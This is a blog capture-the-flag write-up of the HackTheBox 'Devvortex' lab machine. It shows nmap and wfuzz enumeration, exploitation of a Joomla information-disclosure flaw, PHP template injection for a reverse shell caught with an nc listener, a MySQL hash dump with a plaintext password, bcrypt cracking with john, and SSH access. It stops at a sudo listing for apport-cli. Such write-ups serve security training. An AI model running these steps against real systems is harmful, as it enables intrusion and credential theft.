<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="index, follow">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
    crossorigin="anonymous"></script>
  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
    </script>
  <link rel="stylesheet" href="/assets/css/style.css?v=43a35ecad141d25f3038dec4f0ade2e126f1de2b">
  <link rel="stylesheet" href="/assets/css/prism.css">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
  
  <meta name="theme-color" content="#000000" />
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox Devvortex Writeup | Gabriel’s writeups</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="HackTheBox Devvortex Writeup" />
<meta name="author" content="gabri47" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="In this machine, we have a joomla web vulnerable to CVE-2023-23752 that gives us the password of lewis user to the database and is reused for joomla login. With this login we can perform RCE editing a joomla template. Then, to escalate as logan, we can connect to the database, retrieve the hash and crack it. Finally, for privilege escalation we have a sudoers privilege that let us run the apport-cli command, whose version is vulnerable to CVE-2023-1326." />
<meta property="og:description" content="In this machine, we have a joomla web vulnerable to CVE-2023-23752 that gives us the password of lewis user to the database and is reused for joomla login. With this login we can perform RCE editing a joomla template. Then, to escalate as logan, we can connect to the database, retrieve the hash and crack it. Finally, for privilege escalation we have a sudoers privilege that let us run the apport-cli command, whose version is vulnerable to CVE-2023-1326." />
<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Devvortex.html" />
<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Devvortex.html" />
<meta property="og:site_name" content="Gabriel’s writeups" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-04-26T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox Devvortex Writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-04-26T00:00:00+02:00","datePublished":"2024-04-26T00:00:00+02:00","description":"In this machine, we have a joomla web vulnerable to CVE-2023-23752 that gives us the password of lewis user to the database and is reused for joomla login. With this login we can perform RCE editing a joomla template. Then, to escalate as logan, we can connect to the database, retrieve the hash and crack it. Finally, for privilege escalation we have a sudoers privilege that let us run the apport-cli command, whose version is vulnerable to CVE-2023-1326.","headline":"HackTheBox Devvortex Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Devvortex.html"},"url":"http://localhost:4000/writeups/2024/HTB/Devvortex.html"}</script>
<!-- End Jekyll SEO tag -->

  
</head>

<body>

  <div id="header">
    <div class="container">
      <div class="title-container">
        <a id="a-title" href="/">
          <h1>Gabriel's writeups</h1>
        </a>
        <small class="nav-main d-flex justify-content-center">
    
    <a href="/writeups">Writeups</a>
    
     <span style="color: #b5e853;">|</span> 
    
    
    <a href="/solutions">Solutions</a>
    
     <span style="color: #b5e853;">|</span> 
    
    
    <a href="/blog">Blog</a>
    
    
</small>
      </div>
      <br>

      
      
<nav class="navbar navlinks">
    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
        <span>HTB Writeups</span>
        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
    </button>

    <div class="navbar-collapse collapse" id="navbarSupportedContent">
        <div class="m-1 mt-2">

            
            
            

            
            
            

            <small class="m-2">2024</small>
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HackTheBox Codify Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HackTheBox Hospital Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HackTheBox Surveillance writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HackTheBox Devvortex Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HackTheBox Napper Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HackTheBox Monitored Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HackTheBox Ouija Writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HackTheBox Bizness Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HackTheBox Analysis Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                
            </ul>

            
            

            
            

        </div>
    </div>
</nav>

      

      
      <div id="bottom-bar">
        <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

      </div>
    </div>
  </div>

  <div id="content" class="container">
    <section id="main_content">
      <h5 class="mt-0 mb-2">
        
        
          HTB
        
        
      </h5>
    
      <h1 class="d-flex w-100 justify-content-between">
        
        
          <span>HackTheBox Devvortex Writeup</span> <span class="points"> [20 pts] </span>
        
        
      </h1>


<script>

</script>

<p>In this machine, we have a joomla web vulnerable to <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure">CVE-2023-23752</a> that gives us the password of lewis user to the database and is reused for joomla login. With this login we can perform RCE editing a joomla template. Then, to escalate as logan, we can connect to the database, retrieve the hash and crack it. Finally, for privilege escalation we have a sudoers privilege that let us run the apport-cli command, whose version is vulnerable to <a href="https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb">CVE-2023-1326</a>.</p>
    
      <h1 id="enumeration">
        
        
          Enumeration <a href="#enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>
    
      <h2 id="port-scanning">
        
        
          Port scanning <a href="#port-scanning" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h2>

<p>We need to start with a port scanning to see which services are available in order to try to exploit them:</p>

<pre><code class="language-bash">❯ sudo nmap -p- -sVC --open -sS --min-rate 5000 -n -Pn 10.10.11.242 -oN tcpTargeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 17:05 CEST
Nmap scan report for 10.10.11.242
Host is up (0.097s latency).
Not shown: 65525 closed tcp ports (reset), 8 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds
</code></pre>

<p>We can see port 22 of ssh with a newer version and port 80 with also a newer version and a redirect to devvortex.htb, let’s add it to the /etc/hosts for resolving that domain to the ip of the machine:</p>

<pre><code class="language-bash">❯ sudo echo '10.10.11.242 devvortex.htb' | sudo tee -a /etc/hosts
10.10.11.242 devvortex.htb
</code></pre>
    
      <h2 id="web-enumeration">
        
        
          Web enumeration <a href="#web-enumeration" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h2>

<p>Since we have a domain we can try to discover subdomains by bruteforcing:</p>

<pre><code class="language-bash">❯ wfuzz -c -t 100 -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh=154
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"                                                                                                                  

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
</code></pre>

<p>We discovered the dev subdomain, now let’s add it to the /etc/hosts also:</p>

<pre><code class="language-bash">❯ sudo echo '10.10.11.242 dev.devvortex.htb' | sudo tee -a /etc/hosts
10.10.11.242 dev.devvortex.htb
</code></pre>

<p>Now that we have the domains added, let’s open them in the browser:</p>

<p><img src="/assets/images/Devvortex/devvortex.htb.png" alt="Screenshot of devvortex.htb page"></p>

<p><img src="/assets/images/Devvortex/dev.devvortex.htb.png" alt="Screenshot of dev.devvortex.htb webpage"></p>

<p>Since we don’t see nothing interesting in this pages, we have to discover new folders/files to see in the webserver, I’ll start with devvortex.htb:</p>

<pre><code class="language-bash">❯ wfuzz -c -t 100 -u http://devvortex.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt --hc=404
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://devvortex.htb/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================


Total time: 0
Processed Requests: 4727
Filtered Requests: 4727
Requests/sec.: 0
</code></pre>

<p>With the common wordlist we don’t see nothing, if we don’t have something later, we will try with a bigger dictionary (directory-list-2.3-medium.txt). Now i will try with dev.devvortex.htb:</p>

<pre><code class="language-bash">❯ wfuzz -c -t 100 -u http://dev.devvortex.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt --hc=404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.devvortex.htb/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   403        7 L      10 W       162 Ch      ".bash_history"                                                                                                        
000000025:   403        7 L      10 W       162 Ch      ".htpasswd"                                                                                                            
000000022:   403        7 L      10 W       162 Ch      ".history"                                                                                                             
000000011:   403        7 L      10 W       162 Ch      ".git/config"                                                                                                          
000000009:   403        7 L      10 W       162 Ch      ".git-rewrite"                                                                                                         
000000007:   403        7 L      10 W       162 Ch      ".forward"                                                                                                             
000000037:   403        7 L      10 W       162 Ch      ".svn/entries"                                                                                                         
000000023:   403        7 L      10 W       162 Ch      ".hta"                                                                                                                 
000000029:   403        7 L      10 W       162 Ch      ".passwd"                                                                                                              
000000004:   403        7 L      10 W       162 Ch      ".config"                                                                                                              
000000002:   403        7 L      10 W       162 Ch      ".bashrc"                                                                                                              
000000005:   403        7 L      10 W       162 Ch      ".cvs"                                                                                                                 
000000016:   403        7 L      10 W       162 Ch      ".gitconfig"                                                                                                           
000000008:   403        7 L      10 W       162 Ch      ".git"                                                                                                                 
000000006:   403        7 L      10 W       162 Ch      ".cvsignore"                                                                                                           
000000014:   403        7 L      10 W       162 Ch      ".git_release"                                                                                                         
000000017:   403        7 L      10 W       162 Ch      ".gitignore"                                                                                                           
000000018:   403        7 L      10 W       162 Ch      ".gitk"                                                                                                                
000000021:   403        7 L      10 W       162 Ch      ".gitreview"                                                                                                           
000000003:   403        7 L      10 W       162 Ch      ".cache"                                                                                                               
000000019:   403        7 L      10 W       162 Ch      ".gitkeep"                                                                                                             
000000015:   403        7 L      10 W       162 Ch      ".gitattributes"                                                                                                       
000000020:   403        7 L      10 W       162 Ch      ".gitmodules"                                                                                                          
000000012:   403        7 L      10 W       162 Ch      ".git/index"                                                                                                           
000000040:   403        7 L      10 W       162 Ch      ".web"                                                                                                                 
000000035:   403        7 L      10 W       162 Ch      ".subversion"                                                                                                          
000000034:   403        7 L      10 W       162 Ch      ".ssh"                                                                                                                 
000000031:   403        7 L      10 W       162 Ch      ".profile"                                                                                                             
000000027:   403        7 L      10 W       162 Ch      ".listings"                                                                                                            
000000033:   403        7 L      10 W       162 Ch      ".sh_history"                                                                                                          
000000030:   403        7 L      10 W       162 Ch      ".perf"                                                                                                                
000000026:   403        7 L      10 W       162 Ch      ".listing"                                                                                                             
000000039:   403        7 L      10 W       162 Ch      ".swf"                                                                                                                 
000000024:   403        7 L      10 W       162 Ch      ".htaccess"                                                                                                            
000000038:   403        7 L      10 W       162 Ch      ".svnignore"                                                                                                           
000000028:   403        7 L      10 W       162 Ch      ".mysql_history"                                                                                                       
000000032:   403        7 L      10 W       162 Ch      ".rhosts"                                                                                                              
000000036:   403        7 L      10 W       162 Ch      ".svn"                                                                                                                 
000000013:   403        7 L      10 W       162 Ch      ".git/logs/"                                                                                                           
000000010:   403        7 L      10 W       162 Ch      ".git/HEAD"                                                                                                            
000000555:   301        7 L      12 W       178 Ch      "administrator"                                                                                                        
000000663:   301        7 L      12 W       178 Ch      "api"                                                                                                                  
000000956:   301        7 L      12 W       178 Ch      "cache"                                                                                                                
000001201:   301        7 L      12 W       178 Ch      "components"                                                                                                           
000002195:   301        7 L      12 W       178 Ch      "includes"                                                                                                             
000002174:   301        7 L      12 W       178 Ch      "images"                                                                                                               
000002094:   200        501 L    1581 W     23221 Ch    "home"                                                                                                                 
000002202:   200        501 L    1581 W     23221 Ch    "index.php"                                                                                                            
000002454:   301        7 L      12 W       178 Ch      "libraries"                                                                                                            
000002433:   301        7 L      12 W       178 Ch      "layouts"                                                                                                              
000002415:   301        7 L      12 W       178 Ch      "language"                                                                                                             
000002640:   301        7 L      12 W       178 Ch      "media"                                                                                                                
000002730:   301        7 L      12 W       178 Ch      "modules"                                                                                                              
000003162:   301        7 L      12 W       178 Ch      "plugins"                                                                                                              
000003581:   200        29 L     105 W      764 Ch      "robots.txt"                                                                                                           
000004108:   301        7 L      12 W       178 Ch      "templates"                                                                                                            
000004180:   301        7 L      12 W       178 Ch      "tmp"                                                                                                                  

Total time: 0
Processed Requests: 4727
Filtered Requests: 4670
Requests/sec.: 0
</code></pre>

<p>We have a bunch of 403 requests with directories followed by a “.” so it’s not relevant because it seems that if we request for a path with some random words followed by a “.”, we have a 403:</p>

<p><img src="/assets/images/Devvortex/403_on_every_path_followed_by_a_..png" alt="A screenshot of how the web page returns 403 in every path followed by a ."></p>

<p>The most interesting thing here is the /administrator path which has a joomla login:</p>

<p><img src="/assets/images/Devvortex/joomla_panel_login.png" alt="Joomla panel login"></p>

<p>We can see the joomla version with the file /README.txt:</p>

<p><img src="/assets/images/Devvortex/README_version.png" alt="README version"></p>

<p>Searching in google for vulnerabilities of this version, we can see <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure">this api endpoint vulnerable to information disclosure</a> in this version 4.2 to retrieve users and config file, let’s use it:</p>

<p><img src="/assets/images/Devvortex/joomla_4.2_vulnerable_endpoint_exploiting.png" alt="Joomla 4.2 vulnerable API endpoint exploiting"></p>

<p>If we try to use this credentials in the joomla login, we login successfully:</p>

<p><img src="/assets/images/Devvortex/login_in_joomla.png" alt="Login"></p>

<p><img src="/assets/images/Devvortex/logged_in.png" alt="Logged in"></p>
    
      <h1 id="access-as-www-data">
        
        
          Access as www-data <a href="#access-as-www-data" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>Now that we have access to the joomla administrator panel, we can perform RCE in the <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce">typical way Joomla is exploited</a> navigating to System &gt; Site Templates &gt; Cassiopeia and in error.php injecting the malicious code:</p>

<p><img src="/assets/images/Devvortex/injecting_php_code.png" alt="Injecting PHP code"></p>

<p><img src="/assets/images/Devvortex/executing_reverse_shell_command.png" alt="Executing reverse shell command"></p>

<p><img src="/assets/images/Devvortex/gaining_access.png" alt="Gaining access"></p>

<p>Let’s stabilize the tty for doing ctrl+l and ctrl+c without any problem:</p>

<pre><code class="language-bash">❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.99] from (UNKNOWN) [10.10.11.242] 34744
bash: cannot set terminal process group (877): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ script /dev/null -c bash
&lt;.htb/templates/cassiopeia$ script /dev/null -c bash         
Script started, file is /dev/null
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ ^Z
[1]  + 439239 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 439239 continued  nc -lvnp 443
                                     reset xterm
www-data@devvortex.htb/templates/cassiopeia$ export TERM=xterm                         
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ export SHELL=bash
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ stty rows 50 columns 184
</code></pre>
    
      <h1 id="privilege-escalation-to-logan">
        
        
          Privilege escalation to logan <a href="#privilege-escalation-to-logan" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>Inspecting the database we can see the logan hash:</p>

<pre><code class="language-bash">www-data@devvortex:~$ mysql -ulewis -p'P4ntherg0t1n5r3c0n##'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.
mysql&gt; show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql&gt; describe sd4fg_users;
+---------------+---------------+------+-----+---------+----------------+
| Field         | Type          | Null | Key | Default | Extra          |
+---------------+---------------+------+-----+---------+----------------+
| id            | int           | NO   | PRI | NULL    | auto_increment |
| name          | varchar(400)  | NO   | MUL |         |                |
| username      | varchar(150)  | NO   | UNI |         |                |
| email         | varchar(100)  | NO   | MUL |         |                |
| password      | varchar(100)  | NO   |     |         |                |
| block         | tinyint       | NO   | MUL | 0       |                |
| sendEmail     | tinyint       | YES  |     | 0       |                |
| registerDate  | datetime      | NO   |     | NULL    |                |
| lastvisitDate | datetime      | YES  |     | NULL    |                |
| activation    | varchar(100)  | NO   |     |         |                |
| params        | text          | NO   |     | NULL    |                |
| lastResetTime | datetime      | YES  |     | NULL    |                |
| resetCount    | int           | NO   |     | 0       |                |
| otpKey        | varchar(1000) | NO   |     |         |                |
| otep          | varchar(1000) | NO   |     |         |                |
| requireReset  | tinyint       | NO   |     | 0       |                |
| authProvider  | varchar(100)  | NO   |     |         |                |
+---------------+---------------+------+-----+---------+----------------+
17 rows in set (0.01 sec)

mysql&gt; select username,password from sd4fg_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
</code></pre>

<p>Let’s try to crack it:</p>

<pre><code class="language-bash">❯ cat logan.hash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: logan.hash
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ john -w=/usr/share/wordlists/rockyou.txt logan.hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:09 DONE (2024-04-27 12:28) 0.1034g/s 145.1p/s 145.1c/s 145.1C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</code></pre>

<p>Now we can ssh with that password to user logan and retrieve user.txt flag:</p>

<pre><code class="language-bash">❯ ssh logan@devvortex.htb
logan@devvortex.htb's password: tequieromucho 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 27 Apr 2024 10:30:06 AM UTC

  System load:  0.0               Processes:             168
  Usage of /:   63.5% of 4.76GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ export TERM=xterm
logan@devvortex:~$ cat user.txt
09****************************2a
</code></pre>
    
      <h1 id="privilege-escalation-to-root">
        
        
          Privilege escalation to root <a href="#privilege-escalation-to-root" class="anchor"><i class="fa fa-link" aria-hidden="true"></i></a>
        
        
      </h1>

<p>Looking at the sudoers privileges, we can see a privilege for running a tool called apport-cli:</p>

<pre><code class="language-bash">logan@devvortex:~$ sudo -l
[sudo] password for logan: tequieromucho
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
</code></pre>

<p>If we run it they say us to see the –help panel, let’s use it:</p>

